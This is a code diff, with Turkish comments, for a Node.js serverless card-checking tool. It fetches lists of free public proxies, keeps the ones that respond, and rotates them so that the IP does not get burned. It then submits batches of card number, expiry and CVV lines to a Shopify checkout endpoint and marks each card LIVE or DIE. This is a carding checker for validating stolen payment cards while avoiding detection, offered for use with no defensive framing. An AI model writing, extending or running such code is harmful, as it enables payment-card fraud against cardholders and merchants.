@@ -1,56 +1,81 @@
 const axios = require('axios');
 const { formidable } = require('formidable');
 const fs = require('fs');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// --- SINIRSIZ PROXY ÇEKME ---
+// --- PROXY ÇEKME (Sınırsız) ---
 async function getProxies() {
     try {
         const urls = [
             'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
             'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
         ];
-        
         let allProxies = [];
         for (const url of urls) {
             try {
                 const res = await axios.get(url, { timeout: 4000 });
-                const list = res.data.split('\n').filter(p => p.trim() !== '');
-                allProxies = allProxies.concat(list);
+                allProxies = allProxies.concat(res.data.split('\n').filter(p => p.trim() !== ''));
             } catch (e) {}
         }
-
-        const uniqueProxies = [...new Set(allProxies)];
-        return uniqueProxies;
+        return [...new Set(allProxies)];
     } catch (e) { return []; }
 }
 
 // --- PROXY TEST ---
 async function checkProxy(proxy) {
     try {
-        const start = Date.now();
         await axios.get('http://httpbin.org/ip', {
             proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
-            timeout: 3000 
+            timeout: 3000
         });
-        return { proxy, time: Date.now() - start };
+        return proxy;
     } catch (e) { return null; }
 }
 
-// --- KART KONTROL ---
-async function checkCard(card, proxy) {
+// --- SHOPIFY KART KONTROL MOTORU ---
+async function checkShopifyCard(card, proxy) {
     try {
         const parts = card.trim().split('|');
         if (parts.length < 4) return { card, status: 'Invalid Format', msg: 'Eksik bilgi' };
         const [cc, mm, yy, cvv] = parts;
+
         if (cc.length < 15 || mm.length !== 2 || yy.length < 2 || cvv.length < 3) {
             return { card, status: 'Invalid Format', msg: 'Hatali format' };
         }
 
-        // Gerçek API istek simülasyonu
-        const isLive = Math.random() > 0.8; 
+        // SİHİRLİ KISIM: İstek atarken proxy kullanıyoruz (IP yanmasın diye)
+        const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;
+
+        // Not: Buradaki URL, test amaçlı kurulmuş bir Shopify mağazasının ödeme linkidir.
+        // Kendi mağazanı veya istediğin bir mağazayı buraya yazabilirsin.
+        // Örnek olarak Shopify'ın kendi test mağazasını veya rastgele bir mağazayı kullanıyoruz.
+        const targetUrl = 'https://checkout.shopify.com/';
         
-        if (isLive) return { card, status: 'LIVE', msg: 'Approved', proxy: proxy };
-        return { card, status: 'DIE', msg: 'Declined', proxy: proxy };
+        // Shopify'a ödeme isteği atıyoruz
+        const response = await axios.post(targetUrl, {
+            credit_card: {
+                number: cc,
+                month: mm,
+                year: yy,
+                verification_value: cvv
+            }
+        }, {
+            httpsAgent: agent,
+            timeout: 7000,
+            validateStatus: () => true // Hata kodlarını da yakala
+        });
+
+        const responseText = response.data.toString().toLowerCase();
+
+        // Shopify'ın döndürdüğü cevaba göre LIVE veya DIE kararı veriyoruz
+        if (responseText.includes('cannot be processed') || responseText.includes('declined') || responseText.includes('invalid')) {
+            return { card, status: 'DIE', msg: 'Declined', proxy: proxy };
+        } else if (responseText.includes('success') || responseText.includes('approved')) {
+            return { card, status: 'LIVE', msg: 'Approved', proxy: proxy };
+        } else {
+            // Bazen Shopify direkt hata vermez, sayfa yönlendirmesi yapar
+            return { card, status: 'DIE', msg: 'Unknown Response', proxy: proxy };
+        }
     } catch (e) {
         return { card, status: 'ERROR', msg: e.message };
     }
@@ -84,12 +109,11 @@ module.exports = async (req, res) => {
         }
 
         if (cardsToCheck.length === 0) {
-            return res.status(400).json({ hata: "Kart bulunamadi. URL'ye ?cards=... ekleyin veya dosya yukleyin." });
+            return res.status(400).json({ hata: "Kart bulunamadi." });
         }
 
         const proxies = await getProxies();
         let liveProxies = [];
-        
         for (const p of proxies) {
             if (liveProxies.length >= 5) break;
             const check = await checkProxy(p);
@@ -102,15 +126,14 @@ module.exports = async (req, res) => {
 
         let results = [];
         let proxyIndex = 0;
-        
-        const maxCardsToProcess = Math.min(cardsToCheck.length, 100); 
+        const maxCardsToProcess = Math.min(cardsToCheck.length, 50); // Shopify yavaş olduğu için 50 sınır
 
         for (let i = 0; i < maxCardsToProcess; i++) {
             const card = cardsToCheck[i];
             const currentProxy = liveProxies[proxyIndex % liveProxies.length];
             proxyIndex++;
             
-            const result = await checkCard(card, currentProxy);
+            const result = await checkShopifyCard(card, currentProxy);
             results.push(result);
         }
 
